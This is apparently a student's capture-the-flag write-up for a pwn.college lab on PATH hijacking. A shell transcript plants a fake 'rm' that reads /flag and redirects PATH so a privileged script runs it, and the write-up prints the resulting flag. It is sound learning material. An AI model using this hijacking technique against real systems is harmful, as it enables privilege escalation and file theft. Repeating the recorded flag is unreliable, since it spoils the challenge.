# Pondering PATH

## Hijacking Commands
Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** `pwn.college{Mjw8PhOyL2Xv1EemOscpmrDVPvH.QX3cjM1wSM4AzNzEzW}`

Made one directory named hijack in which made one file named rm and concatenated that file with the command to read flag by directly mentioning it's path in /bin. Here EOF is end of file which helps us input the code in the script till end of file is reached. Then made the rm file executable, changed the path and ran /challenge/run which gave the flag. Since the path was changed so, rm command was not executed and the flag didn't get deleted by rm command so got the flag.

```bash
hacker@path~hijacking-commands:~$ mkdir ~/hijack
hacker@path~hijacking-commands:~$ cat > ~/hijack/rm << "EOF"
> #!/bin/bash
> /bin/cat /flag
> EOF
hacker@path~hijacking-commands:~$ chmod a+x ~/hijack/rm
hacker@path~hijacking-commands:~$ PATH=/hijack
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 7: rm: command not found
hacker@path~hijacking-commands:~$ PATH=~/hijack
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{Mjw8PhOyL2Xv1EemOscpmrDVPvH.QX3cjM1wSM4AzNzEzW}
```

### New Learnings
Learned to use commands even after changing the PATH by manipulation.

### References 
No references used.
